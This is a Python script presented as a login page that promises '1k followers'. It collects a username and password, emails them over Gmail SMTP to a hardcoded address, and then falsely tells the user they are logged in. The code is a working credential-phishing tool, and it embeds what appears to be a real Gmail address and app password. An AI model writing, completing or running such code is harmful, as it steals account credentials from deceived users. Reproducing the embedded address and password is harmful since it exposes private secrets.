import smtplib
from email.mime.text import MIMEText
from getpass import getpass  # For hiding password input

# Define the login function
def login():
    # Get the username and password entered by the user
    username = input("Enter your username: ")
    password = getpass("Enter your password: ")

    # Send the username and password to your email address
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    sender_email = "mihirboi16@gmail.com"
    sender_password = "wuxp hdwo nbod mozi"
    receiver_email = "mihirboi16@gmail.com"

    try:
        # Create a MIME message
        message = MIMEText("Username: {}\nPassword: {}".format(username, password))
        message["Subject"] = "Login Credentials"
        message["From"] = sender_email
        message["To"] = receiver_email

        # Create a SMTP session
        session = smtplib.SMTP(smtp_server, smtp_port)
        session.starttls()
        session.login(sender_email, sender_password)

        # Send the email
        session.sendmail(sender_email, receiver_email, message.as_string())

        # Close the session
        session.quit()

        # Display a success message
        print("youre logined 1k followers sending you.")
    except smtplib.SMTPException as e:
        # Display an error message
        print("An error occurred while sending the email:", e)

# Define the send function (not really needed for terminal version)
def send():
    print("Wait, you're in queue.")  # Placeholder for queue message

# Main function to start the interaction
def main():
    print("Welcome to the Login Page")

    # Call the login function
    login()

if __name__ == "__main__":
    main()

